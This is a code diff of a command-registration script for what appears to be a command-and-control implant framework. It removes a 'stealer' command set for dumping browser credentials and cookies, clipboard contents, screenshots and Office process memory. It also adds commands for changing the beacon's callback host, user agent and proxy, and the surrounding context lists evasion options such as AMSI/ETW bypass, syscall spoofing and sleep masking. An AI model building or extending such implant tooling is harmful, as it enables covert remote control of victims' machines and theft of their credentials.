@@ -79,21 +79,6 @@ function RegisterCommands(listenerType)
     let cmd_ps = ax.create_command("ps", "Process management - list, create, and terminate processes");
     cmd_ps.addSubCommands([cmd_ps_list, cmd_ps_run, _cmd_ps_kill]);
 
-    /// STEALER
-
-    let cmd_stealer_browserdmp = ax.create_command("browser-dump", "Extract saved credentials and cookies from browser profile", "stealer browser-dump chrome", "Task: dump browser credentials and cookies");
-    cmd_stealer_browserdmp.addArgString("browser_name", true, "Browser name (currently only 'chrome' is supported)");
-
-    let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
-
-    let cmd_stealer_clipdump = ax.create_command("clipdump", "Retrieve current clipboard contents", "stealer clipdump", "Task: dump clipboard data");
-
-    let cmd_stealer_officedump = ax.create_command("office-dump", "Extract credentials from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump Office credentials from memory");
-    cmd_stealer_officedump.addArgInt("office_pid", true, "Process ID of running Office application");
-
-    let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
-    cmd_stealer.addSubCommands([cmd_stealer_browserdmp, cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump]);
-
     /// JOB
     /// let cmd_job_list = ax.create_command("list", "Display all currently running background jobs", "job list", "Task: enumerate running jobs");
 
@@ -176,17 +161,30 @@ function RegisterCommands(listenerType)
     cmd_config_wkrtime.addArgString("end", true);
 
     let cmd_config_syscall = ax.create_command("syscall", "Change the syscall method", "config syscall spoof_indirect");
-    cmd_config_syscall.addArgFlagString("syscall", true, "options: 'spoof', 'spoof_indirect' or 'none'");
+    cmd_config_syscall.addArgString("syscall", true, "options: 'spoof', 'spoof_indirect' or 'none'");
 
-    let cmd_config_forkpipe = ax.create_command("fork_pipe_name", "Change named pipe to use in fork commands", "config fork_pipe_name \\.\pipe\new_pipe_name")
-    cmd_config_forkpipe.addArgFlagString("name", true)
+    let cmd_config_forkpipe = ax.create_command("fork_pipe_name", "Change named pipe to use in fork commands", "config fork_pipe_name \\\\.\\pipe\\new_pipe_name");
+    cmd_config_forkpipe.addArgString("name", true)
+
+    let cmd_config_callbackhost = ax.create_command("callback.http.host", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
+    cmd_config_callbackhost.addArgString("action", true)
+    cmd_config_callbackhost.addArgString("callback_host", true)
+
+    let cmd_config_callbackuseragent = ax.create_command("callback.http.useragent", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
+    cmd_config_callbackuseragent.addArgString("useragent", true)
+
+    let cmd_config_callbackproxy = ax.create_command("callback.http.proxy", "Change the callback host list for http profile (use 'info' command to show callback settings)", "config callbackhost add server1337.com:443");
+    cmd_config_callbackproxy.addArgBool("enabled", true)
+    cmd_config_callbackproxy.addArgString("url", false)
+    cmd_config_callbackproxy.addArgString("username", false)
+    cmd_config_callbackproxy.addArgString("password", false)
 
     let cmd_config = ax.create_command("config", "Configuration management - adjust beacon behavior and settings", "config sleep 50s");
     cmd_config.addSubCommands([
         cmd_config_sleep, cmd_config_jitter, cmd_config_ppid, cmd_config_blockdll, cmd_config_wkrtime,
         cmd_config_killdate_date, cmd_config_killdate_exit, cmd_config_killdate_selfdel, 
         cmd_config_heap_obf, cmd_config_mask, cmd_config_amsietwbypass, cmd_config_spawnto,
-        cmd_config_inject_write, cmd_config_inject_alloc, cmd_config_syscall, cmd_config_forkpipe
+        cmd_config_inject_write, cmd_config_inject_alloc, cmd_config_syscall, cmd_config_forkpipe, cmd_config_callbackhost
     ]);
 
     /// INFO
@@ -275,10 +273,6 @@ function GenerateUI(listenerType)
     comboFormat.addItem("Bin");
     comboFormat.addItem("Svc");
     comboFormat.setCurrentIndex(0);
-
-    // Debug Mode
-    let debug_check = form.create_check("Debug Mode");
-    debug_check.setChecked(false);
 
     // Sleep / Jitter
     let labelSleep  = form.create_label("Sleep (Jitter %):");
@@ -419,7 +413,6 @@ function GenerateUI(listenerType)
     let layout_scroll = form.create_gridlayout();
     layout_scroll.addWidget(labelFormat,        0, 0, 1, 1);
     layout_scroll.addWidget(comboFormat,        0, 1, 1, 1);
-    layout_scroll.addWidget(debug_check,        0, 2, 1, 1);
     layout_scroll.addWidget(labelSleep,         1, 0, 1, 1);
     layout_scroll.addWidget(textSleep,          1, 1, 1, 1);
     layout_scroll.addWidget(spinJitter,         1, 2, 1, 1);
@@ -473,7 +466,6 @@ function GenerateUI(listenerType)
     // Mask
     container.put("mask_heap", heap_obf_check)
     container.put("mask_sleep", sleep_mask_combo)
-    container.put("debug_mode", debug_check)
 
     let panel = form.create_panel()
     panel.setLayout(layout)
